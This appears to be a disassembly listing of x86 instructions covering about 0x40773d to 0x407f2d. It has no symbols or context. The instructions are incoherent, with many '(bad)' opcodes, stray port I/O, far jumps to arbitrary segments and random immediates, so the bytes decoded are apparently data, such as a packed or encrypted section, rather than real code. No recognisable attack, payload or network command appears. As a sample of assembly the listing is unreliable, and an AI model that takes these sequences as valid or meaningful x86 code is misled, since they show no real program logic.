  40773d:	(bad)  
  40773e:	sti    
  40773f:	dec    eax
  407740:	adc    ebp,DWORD PTR [eax]
  407742:	cdq    
  407743:	dec    esi
  407744:	stc    
  407745:	pop    es
  407746:	or     al,0xc3
  407748:	sub    bl,BYTE PTR [eax-0x45]
  40774b:	adc    edx,esp
  40774d:	int    0xe2
  40774f:	mov    dl,0x7b
  407751:	jo     0x4076dc
  407753:	pop    ds
  407754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407755:	xchg   ebp,eax
  407756:	mov    al,0xbe
  407758:	fidivr WORD PTR [ecx-0x697744c3]
  40775e:	add    ebx,0xdcb3092a
  407764:	bnd jnp 0x40779f
  407767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407768:	xchg   DWORD PTR [ebx+0x3b],ebx
  40776b:	mov    esp,DWORD PTR [edi+eiz*4]
  40776e:	fwait
  40776f:	or     BYTE PTR [edx*4-0x337d771c],0x5e
  407777:	int    0xd9
  407779:	jnp    0x40773f
  40777b:	js     0x4077e2
  40777d:	sub    al,0x56
  40777f:	hlt    
  407780:	or     ebp,DWORD PTR [esi+0x31d3372a]
  407786:	rol    al,0x1a
  407789:	pop    esi
  40778a:	out    0x18,eax
  40778c:	cmp    cl,ch
  40778e:	imul   edx,DWORD PTR [edi-0x375cce8e],0x67
  407795:	or     dl,BYTE PTR [eax]
  407797:	push   0xfffffff7
  407799:	jae    0x407752
  40779b:	sbb    al,0xe7
  40779d:	sbb    DWORD PTR [eax],ecx
  40779f:	scas   eax,DWORD PTR es:[edi]
  4077a0:	enter  0x336d,0x5
  4077a4:	mov    edi,0xcd1829d0
  4077a9:	pop    esi
  4077aa:	imul   edi,DWORD PTR [esi-0x2b],0x1ced4b84
  4077b1:	jo     0x407754
  4077b3:	dec    ecx
  4077b4:	add    al,0xed
  4077b6:	lods   al,BYTE PTR es:[esi]
  4077b8:	pop    edi
  4077b9:	test   al,0x52
  4077bb:	dec    esi
  4077bc:	pop    esi
  4077bd:	push   0xe2d30735
  4077c2:	push   ss
  4077c3:	mov    edx,0xc1cdeae5
  4077c8:	mov    bh,0xcd
  4077ca:	(bad)  
  4077cb:	mov    bh,0x25
  4077cd:	in     eax,dx
  4077ce:	inc    eax
  4077cf:	inc    esi
  4077d0:	jg     0x4077b0
  4077d2:	sub    BYTE PTR [eax-0x68],dl
  4077d5:	pop    edi
  4077d6:	adc    ecx,esi
  4077d8:	jnp    0x407765
  4077da:	dec    esp
  4077db:	xchg   DWORD PTR [ecx+0x22d6f3c],eax
  4077e1:	fs jno 0x407765
  4077e4:	sbb    dl,BYTE PTR [esi]
  4077e6:	pop    ecx
  4077e7:	shl    dh,0x3d
  4077ea:	and    DWORD PTR [esi],edx
  4077ec:	cwd    
  4077ee:	loop   0x4077f5
  4077f0:	push   ebp
  4077f1:	js     0x407787
  4077f3:	das    
  4077f4:	or     edi,edx
  4077f6:	outs   dx,BYTE PTR ds:[esi]
  4077f7:	aad    0xdc
  4077f9:	mov    gs,WORD PTR [ecx]
  4077fb:	popa   
  4077fc:	jo     0x407867
  4077fe:	ror    BYTE PTR [edi-0x574ef5de],0x9f
  407805:	xchg   ecx,eax
  407806:	sub    eax,0x68e429f9
  40780b:	cmp    BYTE PTR [edi],0xc1
  40780e:	sub    cl,BYTE PTR [edi-0x46a07bc5]
  407814:	test   BYTE PTR [bx],cl
  407817:	xor    BYTE PTR [edi+0x6c],ah
  40781a:	or     al,BYTE PTR [esi]
  40781c:	test   DWORD PTR [edx+0x2b5a4d86],edi
  407822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407823:	sub    esi,ebx
  407825:	jecxz  0x40784b
  407827:	dec    eax
  407828:	popf   
  407829:	shl    dl,1
  40782b:	lods   eax,DWORD PTR ds:[esi]
  40782c:	ret    
  40782d:	pop    edi
  40782e:	mov    edx,?
  407830:	mov    al,ds:0x5bb812b2
  407835:	cmp    ebp,DWORD PTR [ebp+0x422c3050]
  40783b:	xlat   BYTE PTR ds:[ebx]
  40783c:	sahf   
  40783d:	mov    WORD PTR [esi-0x68c2f254],ds
  407843:	ret    
  407844:	push   ss
  407845:	sbb    al,0x5a
  407847:	stc    
  407848:	in     al,dx
  407849:	xor    ah,cl
  40784b:	ds ret 0x721
  40784f:	inc    edi
  407850:	sbb    BYTE PTR es:[ecx+ebp*1],bl
  407854:	cs sub eax,0x6994df2e
  40785a:	(bad)  
  40785b:	jmp    0x9d4f:0x77ae5ff2
  407862:	mov    ds,WORD PTR [esp+eiz*2]
  407865:	loopne 0x407848
  407867:	adc    eax,0xbf386c56
  40786c:	xchg   esi,eax
  40786d:	repz cli 
  40786f:	sar    DWORD PTR [esi-0x40060228],1
  407875:	push   ss
  407876:	pop    ebx
  407877:	les    esi,FWORD PTR [eax+eax*8-0x3ea3502d]
  40787e:	and    eax,0xc4975489
  407883:	mov    cl,0x89
  407885:	data16 das 
  407887:	and    al,0x4f
  407889:	xlat   BYTE PTR ds:[ebx]
  40788a:	stos   DWORD PTR es:[edi],eax
  40788b:	iret   
  40788c:	adc    ecx,DWORD PTR [eax+esi*2-0x8]
  407890:	xchg   ebx,eax
  407891:	mov    ebx,0xa9ed9f08
  407896:	xchg   ebx,eax
  407897:	jle    0x407893
  407899:	popf   
  40789a:	push   edi
  40789b:	inc    edx
  40789c:	dec    ecx
  40789d:	pushf  
  40789e:	pop    ebp
  40789f:	fs jmp 0x2e4c:0x4c2bad93
  4078a7:	sub    BYTE PTR [edi],al
  4078a9:	jno    0x4078bb
  4078ab:	sbb    eax,0x1c719d5f
  4078b0:	mov    edx,DWORD PTR [ecx+ebx*2-0x5bdad0f1]
  4078b7:	(bad)  
  4078b8:	stc    
  4078b9:	push   eax
  4078ba:	enter  0x3235,0xe8
  4078be:	(bad)  
  4078c0:	int    0xa4
  4078c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078c3:	ret    0x312f
  4078c6:	fimul  DWORD PTR [esi]
  4078c8:	mov    ebx,0xf13e8017
  4078cd:	add    eax,0x47a62a67
  4078d2:	sbb    esp,DWORD PTR [esi+esi*2-0x228442c2]
  4078d9:	push   edx
  4078da:	aam    0x1b
  4078dc:	xor    BYTE PTR [ecx+0x77],dh
  4078df:	pop    ss
  4078e0:	test   al,0xd6
  4078e2:	sub    DWORD PTR [eax-0x656f7112],edx
  4078e8:	pop    edi
  4078e9:	jmp    0x4078b3
  4078eb:	add    eax,0x4d1cff82
  4078f0:	dec    edx
  4078f1:	jmp    0x40787a
  4078f3:	adc    eax,0xb3b95624
  4078f8:	rcl    ebx,cl
  4078fa:	push   ebx
  4078fb:	das    
  4078fc:	xlat   BYTE PTR ds:[ebx]
  4078fd:	(bad)
  407900:	dec    ebp
  407901:	mov    ah,0x30
  407903:	push   ss
  407904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407905:	fadd   QWORD PTR [ebx-0x3b3e83a5]
  40790b:	xor    eax,0x6a1bec09
  407910:	aaa    
  407911:	ret    
  407912:	mov    ah,0xa4
  407914:	outs   dx,BYTE PTR ds:[esi]
  407915:	mov    bh,0xf0
  407917:	mov    ss,WORD PTR ds:[esi+0x6ee07d8a]
  40791e:	sub    eax,0xa26866b6
  407923:	push   ss
  407924:	cmp    DWORD PTR ds:0xfb0fe17b,eax
  40792a:	mov    WORD PTR ds:0xfe05a590,fs
  407930:	call   0xc22c4779
  407935:	inc    edx
  407936:	sbb    DWORD PTR [ebx+0x17098b73],edx
  40793c:	fist   DWORD PTR [edi+0xff9e829]
  407942:	aaa    
  407943:	mov    ch,BYTE PTR [ebp+0x25f6af42]
  407949:	shl    ch,0x7e
  40794c:	xor    dl,BYTE PTR fs:[edi+0xf]
  407950:	adc    dh,BYTE PTR [edi+0x71]
  407953:	mov    eax,0xa5d01cda
  407958:	fmul   st,st(6)
  40795a:	sahf   
  40795b:	pop    edi
  40795c:	mov    esi,ebx
  40795e:	fnsave [ebx+0x15]
  407961:	push   esp
  407962:	dec    ecx
  407963:	jae    0x4079cd
  407965:	push   cs
  407966:	loopne 0x4079ae
  407968:	inc    ebp
  407969:	dec    edi
  40796a:	push   0xffffff9f
  40796c:	push   0x684ab09d
  407971:	or     bl,BYTE PTR [ebp-0x2f2db2e5]
  407977:	mov    al,ds:0x9df5ee1e
  40797c:	lea    ebx,[eax+0x75fbab5c]
  407982:	or     edx,esi
  407984:	push   ds
  407985:	call   0x563a:0xc32c845f
  40798c:	add    BYTE PTR [edx+0x3c],ch
  40798f:	popa   
  407990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407991:	or     DWORD PTR [esi+0x2a5cb850],0x51
  407998:	or     DWORD PTR [edx],edi
  40799a:	or     al,0xcb
  40799c:	pop    ecx
  40799d:	ficomp WORD PTR [ebp+0x55]
  4079a0:	jmp    0x2408:0x6b5b6b43
  4079a7:	jle    0x4079b1
  4079a9:	js     0x407941
  4079ab:	xor    ecx,DWORD PTR [ecx]
  4079ad:	test   ah,0xd8
  4079b0:	test   BYTE PTR [edx-0x5e],dl
  4079b3:	scas   eax,DWORD PTR es:[edi]
  4079b4:	mov    dl,0x1e
  4079b6:	mov    edx,0xe690e939
  4079bb:	cli    
  4079bc:	adc    BYTE PTR [ebx+0x35],bh
  4079bf:	pop    edx
  4079c0:	and    ebp,DWORD PTR [edx+0x315c3aee]
  4079c6:	ja     0x4079ac
  4079c8:	mov    bh,0xfd
  4079ca:	ror    BYTE PTR [edx-0x2a586120],cl
  4079d0:	call   0x2188:0x9750d4c8
  4079d7:	xor    eax,0x6a21e35d
  4079dc:	(bad)  
  4079dd:	add    BYTE PTR [edi+ebp*1+0x47124c39],0xdd
  4079e5:	pop    esi
  4079e6:	nop
  4079e7:	push   edx
  4079e8:	push   ebx
  4079e9:	sahf   
  4079ea:	fwait
  4079eb:	push   edx
  4079ec:	jno    0x407a06
  4079ee:	test   al,0x83
  4079f0:	mov    bh,0xda
  4079f2:	mov    eax,0x9ff97c95
  4079f7:	push   ebp
  4079f8:	pop    es
  4079f9:	and    ebx,0xffffffe9
  4079fc:	cmp    eax,0x22ef5a74
  407a01:	ror    BYTE PTR [edx-0x3d7e3e54],0xae
  407a08:	add    cl,cl
  407a0a:	shl    DWORD PTR [ebx+0x39],cl
  407a0d:	cmc    
  407a0e:	jmp    0x8240:0x4ec64d95
  407a15:	test   al,0x4c
  407a17:	test   al,0x39
  407a19:	pop    esp
  407a1a:	pushf  
  407a1b:	mov    esp,0xfb6abc02
  407a20:	int    0xd8
  407a22:	or     BYTE PTR [eax+eax*2-0x2d],ah
  407a26:	dec    esi
  407a27:	loope  0x4079f7
  407a29:	gs nop
  407a2b:	and    al,0x56
  407a2d:	aas    
  407a2e:	mov    bh,0xa0
  407a30:	fadd   st(1),st
  407a32:	adc    eax,0xc11db965
  407a37:	sar    BYTE PTR [eax+ebp*8+0x4fe0f73d],cl
  407a3e:	out    0x7a,eax
  407a40:	and    eax,0xe23709e6
  407a45:	xor    DWORD PTR [esi+0x5a],0xe90bc802
  407a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a4d:	popa   
  407a4e:	sahf   
  407a4f:	test   DWORD PTR [esi+0x28],ebp
  407a52:	call   0x7c98:0xab88f527
  407a59:	xchg   edi,eax
  407a5a:	push   edi
  407a5b:	movd   mm3,DWORD PTR [edx-0x2e22f1bf]
  407a62:	and    dl,BYTE PTR [esp+edx*1-0x2c1c4ee1]
  407a69:	rcl    BYTE PTR [edx],cl
  407a6b:	imul   esi,DWORD PTR [eax],0x25
  407a6e:	mov    esp,0x226b8b1c
  407a73:	jmp    0x3d08:0xdd772cb6
  407a7a:	pop    ss
  407a7b:	adc    al,0x99
  407a7d:	in     eax,0x3d
  407a7f:	clc    
  407a80:	mov    edx,0xb07cd047
  407a85:	rcr    DWORD PTR [edi-0x48],0x8a
  407a89:	dec    esi
  407a8a:	test   al,0xde
  407a8c:	imul   edi,DWORD PTR [ebx],0xffffffbe
  407a8f:	in     al,0xe8
  407a91:	das    
  407a92:	xchg   ecx,eax
  407a93:	sub    BYTE PTR [ebx+0x2dccc5f1],0xf2
  407a9a:	mov    bl,0x1f
  407a9c:	pop    edx
  407a9d:	and    al,0x55
  407a9f:	(bad)  
  407aa0:	fabs   
  407aa2:	call   0x35a1ea5b
  407aa7:	sub    bl,BYTE PTR [ecx-0x1a]
  407aaa:	sbb    al,0xfd
  407aac:	mov    ch,0x7b
  407aae:	mov    dl,0x52
  407ab0:	xor    eax,0x5df52ac
  407ab5:	xor    ecx,ecx
  407ab7:	inc    eax
  407ab8:	sub    esi,esi
  407aba:	push   ebx
  407abb:	aas    
  407abc:	call   0x3a3c:0xfe6dd11b
  407ac3:	dec    esi
  407ac4:	lods   eax,DWORD PTR ds:[esi]
  407ac5:	stos   DWORD PTR es:[edi],eax
  407ac6:	adc    DWORD PTR [ebx-0x20adfa04],ecx
  407acc:	mov    DWORD PTR [eax+0x2d],edx
  407acf:	push   cs
  407ad0:	mov    edx,ebp
  407ad2:	popa   
  407ad3:	xchg   ebp,eax
  407ad4:	mov    ebp,0x825e09a7
  407ad9:	pushf  
  407ada:	mov    edx,0xe827beff
  407adf:	jl     0x407aa5
  407ae1:	jnp    0x407ad3
  407ae3:	lea    esi,[ebp+0x390e6c18]
  407ae9:	enter  0x7423,0xc8
  407aed:	leave  
  407aee:	pop    esp
  407aef:	and    DWORD PTR [edi-0x2b],0x16
  407af3:	sbb    ecx,DWORD PTR [ebx+0xaec34cd]
  407af9:	test   al,0x63
  407afb:	and    BYTE PTR [ecx],bh
  407afd:	ror    DWORD PTR [eax],0xf0
  407b00:	mov    dh,0x92
  407b02:	sub    bh,bh
  407b04:	mov    dl,0x2e
  407b06:	pop    esp
  407b07:	jmp    0xc629d00e
  407b0c:	fstp   QWORD PTR [eax+0x22]
  407b0f:	or     DWORD PTR [ebx],0x76
  407b12:	out    0x47,al
  407b14:	ds call 0x5d25868c
  407b1a:	inc    esi
  407b1b:	xchg   ebp,eax
  407b1c:	pop    ss
  407b1d:	das    
  407b1e:	sbb    al,0xd3
  407b20:	sub    DWORD PTR [edx+0x1fa5f3c],ebp
  407b26:	aam    0x6a
  407b28:	jbe    0x407abd
  407b2a:	add    DWORD PTR [ecx-0x4a],esp
  407b2d:	xchg   edi,eax
  407b2e:	xor    BYTE PTR [ecx-0x19120819],ch
  407b34:	scas   eax,DWORD PTR es:[edi]
  407b35:	test   al,0x56
  407b37:	sti    
  407b38:	in     al,dx
  407b39:	dec    edx
  407b3a:	out    dx,eax
  407b3b:	cmp    eax,0x5479c805
  407b40:	jp     0x407ac2
  407b42:	out    0x7a,eax
  407b44:	inc    ecx
  407b45:	jno    0x407b2b
  407b47:	push   ebp
  407b48:	jle    0x407b76
  407b4a:	clc    
  407b4b:	scas   al,BYTE PTR es:[edi]
  407b4c:	cmp    ah,BYTE PTR [esi+ebx*8]
  407b4f:	rol    DWORD PTR [ecx-0x60f201eb],cl
  407b55:	xchg   ecx,eax
  407b56:	stc    
  407b57:	mov    ch,0xa3
  407b59:	push   cs
  407b5a:	rcr    BYTE PTR [ecx+0x1],0x6b
  407b5e:	js     0x407b8c
  407b60:	rcr    BYTE PTR [edi],cl
  407b62:	dec    eax
  407b63:	test   eax,0xd85e509d
  407b68:	mov    al,BYTE PTR ds:0xdf82d041
  407b6e:	mov    al,0xb8
  407b70:	jae    0x407b12
  407b72:	adc    eax,0x1a00495e
  407b77:	rcr    BYTE PTR [ebx+eax*4+0x590bab7e],0x78
  407b7f:	bound  eax,QWORD PTR ds:0x955cccd2
  407b85:	aam    0x62
  407b87:	ins    BYTE PTR es:[edi],dx
  407b88:	jbe    0x407bff
  407b8a:	pop    edx
  407b8b:	pop    ebx
  407b8c:	jae    0x407b53
  407b8e:	sub    ebp,DWORD PTR [ecx]
  407b90:	jns    0x407b54
  407b92:	outs   dx,BYTE PTR ds:[esi]
  407b93:	adc    cl,dh
  407b95:	out    0x66,al
  407b97:	psubusw mm0,QWORD PTR [ebp+0xda81126]
  407b9e:	sbb    DWORD PTR [ecx-0x41],0xffffff98
  407ba2:	(bad)
  407ba5:	sub    BYTE PTR [ecx+ecx*4-0x209ba899],dl
  407bac:	lock adc dl,cl
  407baf:	rcr    BYTE PTR [edi-0x13],0xbe
  407bb3:	not    bl
  407bb5:	inc    esi
  407bb6:	add    DWORD PTR [esi+0x76],esi
  407bb9:	pop    edx
  407bba:	test   BYTE PTR [ecx],0x2b
  407bbd:	mov    al,0x98
  407bbf:	push   ecx
  407bc0:	xlat   BYTE PTR ds:[ebx]
  407bc1:	push   esi
  407bc2:	out    0x31,al
  407bc4:	push   bp
  407bc6:	test   DWORD PTR [eax+edi*2],0xb0bde331
  407bcd:	ficom  DWORD PTR [ebx]
  407bcf:	and    cl,0x8a
  407bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bd3:	stos   DWORD PTR es:[edi],eax
  407bd4:	jmp    0xec7d1aac
  407bd9:	rep outs dx,BYTE PTR ds:[esi]
  407bdb:	scas   eax,DWORD PTR es:[edi]
  407bdc:	jnp    0x407bc3
  407bde:	sub    dh,BYTE PTR [esi]
  407be0:	add    esi,edx
  407be2:	(bad)  
  407be3:	mov    esi,0x1c412d08
  407be8:	addr16 out 0xea,al
  407beb:	add    esi,DWORD PTR [edi-0x3eaa65f0]
  407bf1:	adc    ah,dh
  407bf3:	out    dx,eax
  407bf4:	or     al,0x5d
  407bf6:	fidivr WORD PTR [ebp+0x233b675b]
  407bfc:	pop    edx
  407bfd:	push   ss
  407bfe:	ror    BYTE PTR [edx-0x5e],1
  407c01:	das    
  407c02:	add    eax,0xfe25115b
  407c07:	mov    BYTE PTR [esi+0x4e7a37ef],dh
  407c0d:	sub    cl,BYTE PTR [edx+0x3758a875]
  407c13:	sbb    DWORD PTR [edi],0xffffffbd
  407c16:	in     eax,dx
  407c17:	cmp    BYTE PTR [ecx+0x3c],0xeb
  407c1b:	es dec dx
  407c1e:	(bad)  
  407c1f:	fdivr  st,st(0)
  407c21:	mov    ds:0xd6a79167,al
  407c26:	push   es
  407c27:	int3   
  407c28:	jne    0x407c2f
  407c2a:	push   es
  407c2b:	push   edx
  407c2c:	out    dx,eax
  407c2d:	jnp    0x407c1c
  407c2f:	push   ecx
  407c30:	mov    ds:0x5d475a24,eax
  407c35:	rcl    BYTE PTR [esi+0x3264d5ec],cl
  407c3b:	push   es
  407c3c:	add    al,0x1e
  407c3e:	mov    DWORD PTR [esi-0x687d17f3],0xf4d6c3cf
  407c48:	repnz pop esi
  407c4a:	out    dx,al
  407c4b:	inc    edi
  407c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c4d:	(bad)  
  407c4e:	sbb    ah,dl
  407c50:	frstor [esi+0x1b661f60]
  407c56:	xchg   esi,eax
  407c57:	repnz or edi,ebp
  407c5a:	cwde   
  407c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c5c:	xor    DWORD PTR [edx],ebx
  407c5e:	sbb    bl,0xb5
  407c61:	and    BYTE PTR [edx+0x48],dl
  407c64:	sahf   
  407c65:	inc    edi
  407c66:	arpl   WORD PTR [ecx],di
  407c68:	sahf   
  407c69:	cld    
  407c6a:	sub    dh,dl
  407c6c:	mov    eax,ds:0x124c08c1
  407c71:	jnp    0x407c30
  407c73:	sbb    al,0x55
  407c75:	mov    ebx,0xd9b4a862
  407c7a:	sbb    DWORD PTR [ebx-0x39],edi
  407c7d:	sbb    al,0x22
  407c7f:	lock and BYTE PTR [esi-0xd2de94b],bh
  407c86:	repz dec edx
  407c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c89:	xchg   edx,eax
  407c8a:	ins    DWORD PTR es:[edi],dx
  407c8b:	pop    edx
  407c8c:	lods   eax,DWORD PTR ds:[esi]
  407c8d:	hlt    
  407c8e:	jp     0x407c91
  407c90:	cs inc edx
  407c92:	in     al,0xc9
  407c94:	add    BYTE PTR [edx],ah
  407c96:	mov    eax,ds:0x6369cfea
  407c9b:	(bad)  
  407c9c:	popf   
  407c9d:	loop   0x407ccc
  407c9f:	(bad)  
  407ca0:	ss mov dl,0xb5
  407ca3:	nop
  407ca4:	jae    0x407d0c
  407ca6:	arpl   WORD PTR [esi],ax
  407ca8:	xor    BYTE PTR [edx],bh
  407caa:	ficom  DWORD PTR [edx-0x721ceca9]
  407cb0:	or     al,0xeb
  407cb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cb3:	push   esp
  407cb4:	fwait
  407cb5:	sub    BYTE PTR [edx+0xd0f4b49],cl
  407cbb:	cld    
  407cbc:	pop    ebp
  407cbd:	mov    eax,ds:0x3b29dc87
  407cc2:	sub    dl,bh
  407cc4:	mov    DWORD PTR [esi],eax
  407cc6:	adc    ah,cl
  407cc8:	xor    eax,0x2a8f9633
  407ccd:	lea    si,[edx+0x15]
  407cd1:	mov    eax,ds:0x14da6d67
  407cd6:	sbb    esi,0x705c6f1f
  407cdc:	mov    ecx,0x35133bc1
  407ce1:	(bad)  
  407ce2:	adc    al,0x5c
  407ce4:	hlt    
  407ce5:	sar    BYTE PTR [ebp-0x569ef820],cl
  407ceb:	sbb    dh,BYTE PTR [ebx]
  407ced:	sub    eax,0x18984c63
  407cf2:	bound  edi,QWORD PTR [edx+0x7a]
  407cf5:	cmp    esi,eax
  407cf7:	(bad)  
  407cf8:	dec    eax
  407cf9:	repnz push es
  407cfb:	xlat   BYTE PTR ds:[ebx]
  407cfc:	adc    bl,bh
  407cfe:	add    eax,0x65b239c8
  407d03:	xor    DWORD PTR es:[ebx+0x5a9c8ae6],ebp
  407d0a:	enter  0x5312,0x5f
  407d0e:	lods   eax,DWORD PTR ds:[esi]
  407d0f:	jae    0x407c9e
  407d11:	mov    ecx,0x552f25e3
  407d16:	les    esi,FWORD PTR ds:0xb946ecc3
  407d1c:	push   es
  407d1d:	dec    edx
  407d1e:	jnp    0x407d10
  407d20:	pavgb  mm4,QWORD PTR [edi-0x4c]
  407d24:	sahf   
  407d25:	sbb    al,0xf0
  407d27:	pop    es
  407d28:	stos   DWORD PTR es:[edi],eax
  407d29:	cmp    ch,BYTE PTR [edi]
  407d2b:	outs   dx,DWORD PTR ds:[esi]
  407d2c:	adc    al,0x87
  407d2e:	sahf   
  407d2f:	xchg   edi,eax
  407d30:	lock out 0x1f,al
  407d33:	push   0xdbb9aad1
  407d38:	push   0xffffffce
  407d3a:	inc    esp
  407d3b:	in     al,0xf4
  407d3d:	and    ah,BYTE PTR [edx+0x4d9ec6ba]
  407d43:	adc    al,0xd0
  407d45:	xchg   esp,eax
  407d46:	dec    edi
  407d47:	dec    DWORD PTR [edi+ecx*8-0x7eb8f3cd]
  407d4e:	(bad)  
  407d4f:	dec    ecx
  407d50:	or     DWORD PTR [eax+0x3d],0xeffb342a
  407d57:	in     eax,dx
  407d58:	sbb    ebp,ecx
  407d5a:	push   esp
  407d5b:	cmp    al,0x91
  407d5d:	dec    ecx
  407d5e:	in     eax,0x3e
  407d60:	clc    
  407d61:	cmp    esi,DWORD PTR [esi+0x3d3b70cc]
  407d67:	and    bh,BYTE PTR [edi+0x61a8512a]
  407d6d:	mov    dh,0xd8
  407d6f:	or     eax,0x7b5baea
  407d74:	in     al,dx
  407d75:	xor    eax,0xc88bcdc8
  407d7a:	hlt    
  407d7b:	daa    
  407d7c:	mov    ebp,0x8e3fe3d9
  407d81:	push   ss
  407d82:	loopne 0x407d14
  407d84:	lea    ecx,[ebp+0x13]
  407d87:	(bad)  
  407d88:	repz lock add eax,0x79b4b09b
  407d8f:	pop    ebp
  407d90:	pop    ecx
  407d91:	sub    al,0x7b
  407d93:	scas   eax,DWORD PTR es:[edi]
  407d94:	and    DWORD PTR [ebx],eax
  407d96:	rcr    ebp,0x4e
  407d99:	dec    ecx
  407d9a:	inc    edx
  407d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d9c:	mov    ebx,0x85b80d8e
  407da1:	mov    DWORD PTR ds:0xacb6beb2,ebp
  407da7:	cmp    ebp,eax
  407da9:	retf   0x31be
  407dac:	pusha  
  407dad:	lds    esi,FWORD PTR [ebx+0x2e722f21]
  407db3:	lods   eax,DWORD PTR ds:[esi]
  407db4:	mov    ds:0xa4b7d6b8,al
  407db9:	lods   al,BYTE PTR ds:[esi]
  407dba:	or     DWORD PTR [eax],ecx
  407dbc:	aad    0xb5
  407dbe:	xchg   edi,eax
  407dbf:	fs pop ebx
  407dc1:	dec    eax
  407dc2:	in     eax,0x6e
  407dc4:	adc    al,0xd8
  407dc6:	bound  esp,QWORD PTR [ecx+edi*2+0x19ea139b]
  407dcd:	fsub   DWORD PTR [ebx+ecx*8-0x2e860d9a]
  407dd4:	adc    DWORD PTR [edx],0x3a5f9394
  407dda:	xchg   esi,eax
  407ddb:	fs jge 0x407e15
  407dde:	jne    0x407e55
  407de0:	xchg   DWORD PTR [eax],edi
  407de2:	mov    edx,0x9bc55bd
  407de7:	inc    esi
  407de8:	mov    eax,ds:0xceb51241
  407ded:	das    
  407dee:	dec    eax
  407def:	scas   al,BYTE PTR es:[edi]
  407df0:	xchg   esp,eax
  407df1:	(bad)  
  407df2:	jle    0x407d83
  407df4:	hlt    
  407df5:	je     0x407e3e
  407df7:	out    dx,eax
  407df8:	or     eax,0x885e938f
  407dfd:	mov    al,0xde
  407dff:	push   esp
  407e00:	cli    
  407e01:	pop    es
  407e02:	mov    ebx,0xc4cd90ae
  407e07:	cwde   
  407e08:	out    dx,al
  407e09:	jl     0x407e3c
  407e0b:	int    0x50
  407e0d:	and    ah,0xa8
  407e10:	sub    bh,BYTE PTR [eax-0x3a]
  407e13:	(bad)  
  407e14:	xor    esp,DWORD PTR [ebx-0x71]
  407e17:	pusha  
  407e18:	or     eax,0x31de6d1a
  407e1d:	psllq  mm5,mm6
  407e20:	sbb    bl,BYTE PTR [esi]
  407e22:	out    0xc0,eax
  407e24:	inc    esi
  407e25:	inc    esp
  407e26:	xchg   DWORD PTR [edx-0x55],edx
  407e29:	dec    ebp
  407e2a:	call   0xc1003c69
  407e2f:	ins    DWORD PTR es:[edi],dx
  407e30:	test   al,0x51
  407e32:	dec    esp
  407e33:	arpl   WORD PTR [esi-0x694c72af],dx
  407e39:	je     0x407e5c
  407e3b:	fbstp  TBYTE PTR [ebp-0x71aeb092]
  407e41:	mov    ah,0x56
  407e43:	lds    ecx,FWORD PTR [ecx]
  407e45:	adc    BYTE PTR [esi],dl
  407e47:	mov    cs,WORD PTR [edi-0x229d3550]
  407e4d:	mov    gs,WORD PTR [edi+ecx*4-0x4]
  407e51:	mov    edx,0x554939e1
  407e56:	gs stos DWORD PTR es:[edi],eax
  407e58:	mov    ds:0xb0c86e76,al
  407e5d:	and    edi,edi
  407e5f:	std    
  407e60:	out    dx,al
  407e61:	bound  ebx,QWORD PTR [eax+0xd2669a8]
  407e67:	fidiv  WORD PTR [ebx-0x7f47c509]
  407e6d:	(bad)  
  407e6e:	or     bh,BYTE PTR [eax-0x44feead0]
  407e74:	pop    esi
  407e75:	adc    al,0x54
  407e77:	sub    eax,0xfe45a014
  407e7c:	mov    eax,0xf8706596
  407e81:	mov    edx,0x69d29e09
  407e86:	sbb    ch,BYTE PTR ds:0x57fc183d
  407e8c:	push   ecx
  407e8d:	mov    ds:0xfd9f5223,al
  407e92:	in     eax,dx
  407e93:	aas    
  407e94:	nop
  407e95:	mov    bh,0xd2
  407e97:	jecxz  0x407e38
  407e99:	mov    eax,ds:0x7d5f56c0
  407e9e:	inc    eax
  407e9f:	push   eax
  407ea0:	sbb    ecx,DWORD PTR [ecx-0x58]
  407ea3:	mov    dh,0xc4
  407ea5:	cdq    
  407ea6:	jnp    0x407ec2
  407ea8:	sub    ebx,DWORD PTR [eax]
  407eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407eab:	adc    DWORD PTR [edx+0xc],edx
  407eae:	inc    edi
  407eaf:	mov    ah,BYTE PTR [eax-0xa848887]
  407eb5:	adc    al,0xa3
  407eb7:	push   edx
  407eb8:	mov    ds:0x94f9574c,eax
  407ebd:	fadd   QWORD PTR [esp+edx*2-0x4e]
  407ec1:	cwde   
  407ec2:	jmp    0x81c91a6f
  407ec7:	aam    0x16
  407ec9:	repnz mov ecx,0xf1b629a3
  407ecf:	out    0x8,eax
  407ed1:	vminpd xmm2,xmm2,XMMWORD PTR [esi-0x1b9bd324]
  407ed9:	mov    ebx,0xa9d12e71
  407ede:	inc    edi
  407edf:	jge    0x407ea0
  407ee1:	cmp    al,0x21
  407ee3:	loope  0x407f16
  407ee5:	test   BYTE PTR [ecx+0x2e],0xad
  407ee9:	call   0xc2b7:0x1e492e17
  407ef0:	push   cs
  407ef1:	mov    edi,0xb08d567c
  407ef6:	std    
  407ef7:	dec    edi
  407ef8:	push   edi
  407ef9:	dec    DWORD PTR [edx+0x12]
  407efc:	mov    ch,0xac
  407efe:	and    DWORD PTR [ebx+0x4de64140],0xc0939155
  407f08:	jmp    0xb3d6:0x9fff92b1
  407f0f:	jo     0x407ec7
  407f11:	inc    edi
  407f12:	pop    edi
  407f13:	pop    ebp
  407f14:	(bad)  
  407f15:	repnz shl BYTE PTR [ecx-0x57],1
  407f19:	pop    ebx
  407f1a:	in     eax,0x8f
  407f1c:	cmp    BYTE PTR [ebx+0x1e],cl
  407f1f:	arpl   sp,sp
  407f21:	aaa    
  407f22:	(bad)  
  407f23:	mov    ch,0xb1
  407f25:	and    ch,dh
  407f27:	xor    al,0x6a
  407f29:	push   edx
  407f2a:	push   edi
  407f2b:	cmp    ch,BYTE PTR [ebx]
  407f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
